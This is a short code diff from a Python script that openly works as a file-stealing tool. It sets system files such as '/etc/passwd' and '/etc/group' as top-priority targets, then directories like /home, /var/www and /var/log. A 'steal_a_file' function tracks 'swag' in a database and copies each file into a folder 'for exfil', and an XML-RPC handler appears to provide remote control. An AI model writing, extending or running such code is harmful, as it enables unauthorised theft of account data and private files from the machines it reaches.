@@ -22,7 +22,10 @@ db = 'men.db'
 # Where are incoming/outgoing files stored?
 data_dir = 'data'
 # What files are we after on node 0?
+# Files in this list are priority #1
 myfiles = ['/etc/passwd', '/etc/group']
+# Files in the following directories (if they exist)
+# are priority #2 and up, from left-to-right
 mydirs = ['/var/www','/usr/lib/cgi-bin','/var/log','/home','/media']
 
 class RequestHandler(SimpleXMLRPCRequestHandler):
@@ -108,10 +111,11 @@ def steal_a_file(conn):
     # First get the name of the file
     c.execute('select name from swag where stolen = 0 order by priority limit 1')
     file = c.fetchone()
-    # Now, update the status of this file
+    # Now, update the status of this file in the db
     c.execute('update swag set stolen=\'1\' where name = ?', file)
     conn.commit()
     c.close()
+    # Finally, transfer the file to the data_dir for exfil
     shutil.copyfile(file[0], data_dir + '/' + file[0].replace('/','_'))
               
 def store_file_info(conn, filelst):
